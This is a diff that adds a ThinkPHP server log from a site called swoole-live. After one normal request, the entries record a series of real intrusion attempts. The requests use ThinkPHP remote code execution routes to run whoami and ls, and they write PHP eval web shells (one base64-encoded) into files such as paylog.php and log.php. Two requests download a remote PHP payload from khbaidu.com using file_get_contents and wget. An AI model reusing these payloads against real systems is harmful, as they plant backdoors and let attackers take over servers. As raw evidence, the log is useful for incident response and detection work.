@@ -1,0 +1,359 @@
+---------------------------------------------------------------
+[ 2019-01-19T15:35:16+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public/
+[ info ] ltfnevergiveup.cn/swoole-live/public/ [运行时间：0.238128s][吞吐率：4.20req/s] [内存消耗：280.75kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'ltfnevergiveup.cn',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.90 Safari/537.36 2345Explorer/9.4.3.17879',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=4lut4hqgmc7f860uvrshqmfgm2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:21+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=phpinfo&data=1
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=phpinfo&data=1 [运行时间：0.041385s][吞吐率：24.16req/s] [内存消耗：201.28kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=phpinfo&data=1',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'phpinfo',
+  'data' => '1',
+)
+[ info ] [ LOG ] INIT File
+[ error ] [0]variable type error： boolean[/var/www/html/swoole-live/thinkphp/library/think/Response.php:323]
+---------------------------------------------------------------
+[ 2019-01-19T15:35:24+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\template\driver\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\template\driver\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker [运行时间：0.019413s][吞吐率：51.51req/s] [内存消耗：203.13kb] [文件加载：50]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\template\\driver\\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'cacheFile' => 'paylog.php',
+  'content' => '<?php eval($_POST[xiao]);?>hacker',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:24+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ)); [运行时间：0.001994s][吞吐率：501.53req/s] [内存消耗：138.55kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[\'fuck\']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'assert',
+    1 => 
+    array (
+      0 => '@eval($_GET[\'fuck\']);',
+    ),
+  ),
+  'fuck' => 'fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:24+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=system&data=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=system&data=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php [运行时间：0.003594s][吞吐率：278.25req/s] [内存消耗：149.43kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=system&data=echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'system',
+  'data' => 'echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:24+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php [运行时间：0.001561s][吞吐率：640.65req/s] [内存消耗：137.84kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:27+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami [运行时间：0.003585s][吞吐率：278.95req/s] [内存消耗：148.95kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'whoami',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:30+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami [运行时间：0.001616s][吞吐率：618.81req/s] [内存消耗：137.46kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'whoami',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:34+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=system&data=whoami
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=system&data=whoami [运行时间：0.004298s][吞吐率：232.67req/s] [内存消耗：148.93kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=system&data=whoami',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'system',
+  'data' => 'whoami',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:35:43+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=system&data=ls%20-sa
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=system&data=ls%20-sa [运行时间：0.004604s][吞吐率：217.21req/s] [内存消耗：148.93kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=system&data=ls -sa',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'system',
+  'data' => 'ls -sa',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:24+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents(%27csc.php%27,file_get_contents(%27http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt%27));
+[ info ] ltfnevergiveup.cn/swoole-live/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents(%27csc.php%27,file_get_contents(%27http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt%27)); [运行时间：0.001984s][吞吐率：504.06req/s] [内存消耗：138.69kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'host' => 'ltfnevergiveup.cn',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.90 Safari/537.36 2345Explorer/9.4.3.17879',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=4lut4hqgmc7f860uvrshqmfgm2',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'assert',
+    1 => 
+    array (
+      0 => 'file_put_contents(\'csc.php\',file_get_contents(\'http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt\'));',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:35+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\template\driver\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\template\driver\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker [运行时间：0.003944s][吞吐率：253.55req/s] [内存消耗：202.65kb] [文件加载：50]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\template\\driver\\file/write&cacheFile=paylog.php&content=%3C?php%20eval($_POST[xiao]);?%3Ehacker',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'cacheFile' => 'paylog.php',
+  'content' => '<?php eval($_POST[xiao]);?>hacker',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:35+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ)); [运行时间：0.001738s][吞吐率：575.35req/s] [内存消耗：138.55kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[\'fuck\']);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'assert',
+    1 => 
+    array (
+      0 => '@eval($_GET[\'fuck\']);',
+    ),
+  ),
+  'fuck' => 'fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:35+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=system&data=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=system&data=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php [运行时间：0.002973s][吞吐率：336.35req/s] [内存消耗：149.43kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=system&data=echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'system',
+  'data' => 'echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:35+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST[xiao]);?^>^%20>>log.php [运行时间：0.001825s][吞吐率：547.92req/s] [内存消耗：137.84kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'echo ^<^?php eval($_POST[xiao]);?^>^ >>log.php',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-19T15:38:49+08:00 ] 172.16.16.10 119.163.183.234 GET /swoole-live/public//?s=index/\think\Request/input&filter=system&data=wget+-O+help.php+http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt
+[ info ] ltfnevergiveup.cn/swoole-live/public//?s=index/\think\Request/input&filter=system&data=wget+-O+help.php+http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt [运行时间：1.580936s][吞吐率：0.63req/s] [内存消耗：149.49kb] [文件加载：45]
+[ info ] [ LANG ] /var/www/html/swoole-live/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://ltfnevergiveup.cn/swoole-live/public//?s=index/\\think\\Request/input&filter=system&data=wget+-O+help.php+http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => 'ltfnevergiveup.cn',
+)
+[ info ] [ PARAM ] array (
+  'filter' => 'system',
+  'data' => 'wget -O help.php http://www.khbaidu.com/data/cache/listcache/58/e1/a7/s.php.txt',
+)
+[ info ] [ LOG ] INIT File
